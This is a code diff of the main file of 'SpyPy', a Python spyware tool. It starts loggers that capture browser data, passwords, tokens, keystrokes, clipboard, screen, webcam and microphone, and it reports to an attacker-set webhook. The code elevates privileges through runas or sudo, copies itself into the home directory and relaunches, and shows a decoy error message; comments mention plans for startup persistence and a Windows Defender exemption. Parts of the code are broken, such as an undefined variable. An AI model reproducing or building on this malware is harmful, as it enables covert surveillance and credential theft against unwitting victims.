@@ -1,16 +1,15 @@
-# SpyPy
-# Running this file directly will not work as of right now. Please see line 58 to understand why.
-# Feel free to modify this project as you wish. Contributions are always welcome.
-
-# TODO Make all of the loggers actually work
+# TODO Fix this damn code
+# this code is so broken i genuinely have a headache
 import tempfile
 import os
 import threading
 import shutil
 import sys
 import subprocess
+import ctypes
 
 from utils import *
+
 from loggers.browser_logger import BrowserLogger
 from loggers.clipboard_logger import ClipboardLogger
 from loggers.input_logger import InputLogger
@@ -20,15 +19,14 @@ from loggers.screen_logger import ScreenLogger
 from loggers.token_logger import TokenLogger
 from loggers.webcam_logger import WebcamLogger
 
-######################################################
-# These variables will be configured by the builder. #
-# Please do not modify them to avoid any issues.     #
-WEBHOOK_URL = ""                                     #
-SOFTWARE_EXE_NAME = ""                               #
-SOFTWARE_DIR_NAME = ""                               #
-CUSTOM_ERROR_MESSAGE = None                          #
-IS_BUILT = False                                     #
-######################################################
+###############################
+# DO NOT MODIFY THESE VALUES! #
+# THEY ARE SET BY THE BUILDER #
+WEBHOOK_URL = ""  #
+SOFTWARE_EXE_NAME = ""  #
+SOFTWARE_DIR_NAME = ""  #
+CUSTOM_ERROR_MESSAGE = None  #
+###############################
 
 
 class SpyPy:
@@ -36,48 +34,48 @@ class SpyPy:
         if not is_admin():
             try:
                 if get_platform() == "Windows":
+
                     ctypes.windll.shell32.ShellExecuteW(
                         None, "runas", sys.executable, "", None, 1
                     )
+                    os._exit(0)
                 else:
+
                     os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
             except Exception as e:
-                display_error_message("Error", f"Failed to elevate privileges: {e}")
-                os._exit(1)
+                send_webhook("Could not elevate permissions.. Running as user.")
 
         self.logs_path = os.path.join(tempfile.gettempdir(), SOFTWARE_DIR_NAME)
         self.software_dir = os.path.join(os.path.expanduser("~"), SOFTWARE_DIR_NAME)
+
         if not os.path.exists(self.software_dir):
             os.makedirs(self.software_dir)
         if not os.path.exists(self.logs_path):
             os.makedirs(self.logs_path)
 
         self.is_exe = is_exe()
-        self.is_first_run = self.is_exe and not os.path.abspath(__file__).startswith(
-            self.software_dir
-        )
+        self.first_run_flag = os.path.join(self.logs_path, f"{SOFTWARE_EXE_NAME}.flag")
 
         self.setup()
 
         self.loggers = []
-        if self.is_exe:
-            logger_names = [
-                "BrowserLogger",
-                "ClipboardLogger",
-                "InputLogger",
-                "MicrophoneLogger",
-                "PasswordLogger",
-                "ScreenLogger",
-                "TokenLogger",
-                "WebcamLogger",
-            ]
-            for logger_name in logger_names:
-                if not globals().get(logger_name):
-                    continue
-                self.loggers.append(globals().get(logger_name)())
-        else:
-            try:
-                self.loggers = [
+        try:
+            if self.is_exe:
+                logger_class_names = [
+                    "BrowserLogger",
+                    "ClipboardLogger",
+                    "InputLogger",
+                    "MicrophoneLogger",
+                    "PasswordLogger",
+                    "ScreenLogger",
+                    "TokenLogger",
+                    "WebcamLogger",
+                ]
+                for logger_class_name in logger_class_names:
+                    if globals().get(logger_class_name):
+                        self.loggers.append(globals()[logger_class_name]())
+            else:
+                logger_classes = [
                     BrowserLogger(),
                     ClipboardLogger(),
                     InputLogger(),
@@ -87,44 +85,54 @@ class SpyPy:
                     TokenLogger(),
                     WebcamLogger(),
                 ]
-            except Exception as e:
-                send_webhook(
-                    "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
-                )
-                os._exit(1)
+            for logger in logger_classes:
+                self.loggers.append(logger())
+        except Exception as e:
+            send_webhook(
+                "FATAL ERROR: COULD NOT INITIALIZE LOGGERS. PLEASE TRY BUILDING AGAIN OR OPEN AN ISSUE ON GITHUB."
+            )
+            os._exit(1)
 
         self.threads = []
 
     def start(self):
         for logger in self.loggers:
-            if not logger:
-                continue
-            thread = threading.Thread(target=logger.start, name=type(logger).__name__)
-            thread.start()
-            self.threads.append(thread)
+            if logger:
+                thread = threading.Thread(
+                    target=logger.start, name=type(logger).__name__
+                )
+                thread.start()
+                self.threads.append(thread)
 
-    # good to have stop idk when it will be useful
     def stop(self):
         os._exit(0)
 
     def setup(self):
-        if self.is_first_run and not is_exe():
-            current_exe = sys.executable
-            new_exe = os.path.join(self.software_dir, SOFTWARE_EXE_NAME)
-            shutil.copyfile(current_exe, new_exe)
-            subprocess.Popen([new_exe])
-            # TODO add the new exe to startup and make an exception for the new exe in windows defender :D
-            # TODO find out how to add to startup on other platforms
-            if CUSTOM_ERROR_MESSAGE:
-                display_error_message(
-                    f"A fatal error occured while running {SOFTWARE_EXE_NAME}:",
-                    CUSTOM_ERROR_MESSAGE,
-                )
-            os._exit(0)
+        if self.is_exe:
+
+            if not os.path.exists(self.first_run_flag):
+                try:
+                    open(self.first_run_flag, "w").close()
+
+                    current_exe = sys.executable
+                    new_exe = os.path.join(
+                        self.software_dir, os.path.basename(current_exe)
+                    )
+                    shutil.copyfile(current_exe, new_exe)
+                    subprocess.Popen([new_exe])
+                    if CUSTOM_ERROR_MESSAGE:
+                        display_error_message(
+                            f"A fatal error occurred while running {SOFTWARE_EXE_NAME}:",
+                            CUSTOM_ERROR_MESSAGE,
+                        )
+                    os._exit(0)
+                except Exception as e:
+                    send_webhook(
+                        "FATAL ERROR: COULD NOT SETUP FIRST RUN. PLEASE TRY AGAIN OR CHECK LOGS."
+                    )
+                    os._exit(1)
         else:
-            send_webhook(
-                WEBHOOK_URL, f"```SpyPy has been executed on {get_platform()}```"
-            )
+            send_webhook(WEBHOOK_URL, f"SpyPy has been executed on {get_platform()}")
             if CUSTOM_ERROR_MESSAGE:
                 display_error_message("Error", CUSTOM_ERROR_MESSAGE)
 
